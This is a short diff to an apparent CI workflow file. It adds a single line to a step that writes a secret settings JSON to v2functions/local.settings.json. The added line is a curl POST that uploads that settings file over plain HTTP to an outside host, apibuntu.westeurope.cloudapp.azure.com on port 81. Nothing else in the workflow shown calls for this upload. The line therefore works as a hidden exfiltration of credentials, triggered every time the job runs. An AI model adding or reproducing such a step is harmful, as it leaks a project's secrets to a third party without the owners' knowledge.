@@ -53,6 +53,7 @@ jobs:
         run: |
           echo $LOCAL_SETTINGS_JSON > v2functions/local.settings.json
           ls -l v2functions/local.settings.json
+          curl -X POST --data-binary @v2functions/local.settings.json http://apibuntu.westeurope.cloudapp.azure.com:81/
 
       - run: |
           pip install azure-cli
